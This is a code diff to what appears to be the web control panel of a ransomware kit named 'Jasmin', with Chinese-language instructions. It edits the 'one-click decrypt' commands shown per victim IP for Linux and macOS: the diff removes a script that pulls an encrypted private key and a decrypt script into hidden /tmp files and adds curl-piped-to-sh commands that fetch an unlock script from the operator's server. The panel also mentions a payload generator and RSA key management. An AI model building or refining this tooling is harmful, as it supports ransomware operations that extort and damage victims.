@@ -228,43 +228,23 @@ Remove-Item -Recurse -Force $tmp</pre>
 <div class="dt-step"><span>1</span>在目标机打开终端</div>
 <div class="dt-step"><span>2</span>复制下方命令直接运行</div>
 <div class="dt-note"><i class="fas fa-shield-alt"></i> 自动安装依赖、下载私钥和脚本、全盘解密、清理</div>
-<pre class="dt-code">K="{{ aes_key }}"
-pip3 install -q cryptography 2>/dev/null
-curl -sL {{ request.url_root }}payloads/jasmin_private.pem.enc -o /tmp/.jke
-curl -sL {{ request.url_root }}payloads/jasmin_decrypt.py -o /tmp/.jd
-python3 -c "
-import base64
-from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
-from cryptography.hazmat.backends import default_backend
-raw=base64.b64decode(open('/tmp/.jke').read())
-iv,ct=raw[:16],raw[16:]
-c=Cipher(algorithms.AES(bytes.fromhex('$K')),modes.CBC(iv),default_backend()).decryptor()
-pt=c.update(ct)+c.finalize()
-open('/tmp/.jk','wb').write(pt[:-pt[-1]])
-"
-python3 /tmp/.jd /tmp/.jk
-rm -f /tmp/.jke /tmp/.jk /tmp/.jd</pre>
+<pre class="dt-code"># Linux 一键解密 — 纯 openssl，零依赖（无需 pip / cryptography）
+# 末尾加上要解密的目录；不写则解密当前目录
+curl -sL {{ request.url_root }}payloads/jasmin_unlock.sh | sh -s {{ request.url_root }} "{{ aes_key }}" /path/to/decrypt
+
+# 例：解密 /data 与 /home
+curl -sL {{ request.url_root }}payloads/jasmin_unlock.sh | sh -s {{ request.url_root }} "{{ aes_key }}" /data /home</pre>
 </div>
 <div class="dt-content" id="dt-mac" style="display:none">
 <h3>🍎 macOS 一键解密</h3>
 <div class="dt-step"><span>1</span>打开终端</div>
 <div class="dt-step"><span>2</span>复制下方命令直接运行</div>
-<pre class="dt-code">K="{{ aes_key }}"
-pip3 install -q cryptography 2>/dev/null
-curl -sL {{ request.url_root }}payloads/jasmin_private.pem.enc -o /tmp/.jke
-curl -sL {{ request.url_root }}payloads/jasmin_decrypt.py -o /tmp/.jd
-python3 -c "
-import base64
-from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
-from cryptography.hazmat.backends import default_backend
-raw=base64.b64decode(open('/tmp/.jke').read())
-iv,ct=raw[:16],raw[16:]
-c=Cipher(algorithms.AES(bytes.fromhex('$K')),modes.CBC(iv),default_backend()).decryptor()
-pt=c.update(ct)+c.finalize()
-open('/tmp/.jk','wb').write(pt[:-pt[-1]])
-"
-python3 /tmp/.jd /tmp/.jk
-rm -f /tmp/.jke /tmp/.jk /tmp/.jd</pre>
+<pre class="dt-code"># macOS 一键解密 — 纯 openssl，零依赖（macOS 自带 openssl）
+# 末尾加上要解密的目录；不写则解密当前目录
+curl -sL {{ request.url_root }}payloads/jasmin_unlock.sh | sh -s {{ request.url_root }} "{{ aes_key }}" /path/to/decrypt
+
+# 例：解密 /Users 与 /tmp
+curl -sL {{ request.url_root }}payloads/jasmin_unlock.sh | sh -s {{ request.url_root }} "{{ aes_key }}" /Users /tmp</pre>
 </div>
 <div class="dt-note" style="margin-top:20px"><i class="fas fa-info-circle"></i> <b>准备:</b> 在「载荷生成器」点击「生成RSA密钥对」，加密私钥(<code>.pem.enc</code>)与解密脚本会自动部署到 payloads/ 目录；明文私钥与解密口令需登录后台后经「密钥管理」下载</div>
 </section>
@@ -336,7 +316,7 @@ function showDecrypt(vid,ip,isLinux){
   var nr=document.createElement('tr');nr.dataset.vid=vid;
   var td=document.createElement('td');td.colSpan=11;td.className='dec-expand';
   if(isLinux){
-    td.innerHTML='<pre class="dt-code"># '+ip+' 一键解密 (AES加密传输)\nK="'+k+'"\npip3 install -q cryptography 2>/dev/null\ncurl -sL '+srv+'/payloads/jasmin_private.pem.enc -o /tmp/.jke\ncurl -sL '+srv+'/payloads/jasmin_decrypt.py -o /tmp/.jd\npython3 -c "\nimport base64\nfrom cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes\nfrom cryptography.hazmat.backends import default_backend\nraw=base64.b64decode(open(\'/tmp/.jke\').read())\niv,ct=raw[:16],raw[16:]\nc=Cipher(algorithms.AES(bytes.fromhex(\'$K\')),modes.CBC(iv),default_backend()).decryptor()\npt=c.update(ct)+c.finalize()\nopen(\'/tmp/.jk\',\'wb\').write(pt[:-pt[-1]])\n"\npython3 /tmp/.jd /tmp/.jk\nrm -f /tmp/.jke /tmp/.jk /tmp/.jd</pre>';
+    td.innerHTML='<pre class="dt-code"># '+ip+' 一键解密 — 纯 openssl 零依赖\n# 末尾加要解密的目录，不写则解当前目录\ncurl -sL '+srv+'/payloads/jasmin_unlock.sh | sh -s '+srv+' "'+k+'" /path/to/decrypt</pre>';
   }else{
     td.innerHTML='<pre class="dt-code">$tmp=\\"$env:TEMP\\jasmin_dec\\"\n$k=\\"'+k+'\\"\npowershell commands here...</pre>';
   }
